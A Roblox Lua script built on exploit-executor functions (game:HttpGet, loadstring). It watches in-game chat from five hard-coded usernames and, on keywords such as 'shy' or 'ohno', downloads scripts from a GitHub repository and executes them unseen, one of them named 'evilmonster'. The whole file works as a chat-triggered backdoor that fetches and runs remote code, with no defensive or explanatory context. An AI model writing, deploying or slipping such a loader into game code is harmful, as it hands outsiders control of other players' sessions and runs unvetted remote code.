local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local allowed = {
	["project_2kit"] = true,
	["bakonbits54"] = true,
	["sharksinthewater"] = true,
	["theonerulerofgravity"] = true,
	["koolguy1234513"] = true
}

local function safeLoad(url)
	local source = game:HttpGet(url)
	local func = loadstring(source)
	if func then
		func()
	end
end

local function runCommand(msg)
	if typeof(msg) ~= "string" then
		return
	end
	local m = string.lower(msg)
	if string.find(m, "shy", 1, true) then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/shy%20guy")
	elseif string.find(m, "san", 1, true) then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/sand")
	elseif string.find(m, "test", 1, true) then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test")
	elseif string.find(m, "ohno", 1, true) then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/evilmonster")
	end
end

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
	TextChatService.MessageReceived:Connect(function(message)
		if not message.TextSource then
			return
		end
		local player = Players:GetPlayerByUserId(message.TextSource.UserId)
		if player and allowed[string.lower(player.Name)] then
			runCommand(message.Text)
		end
	end)
else
	local function hookPlayer(plr)
		if allowed[string.lower(plr.Name)] then
			plr.Chatted:Connect(runCommand)
		end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		hookPlayer(plr)
	end
	Players.PlayerAdded:Connect(hookPlayer)
end
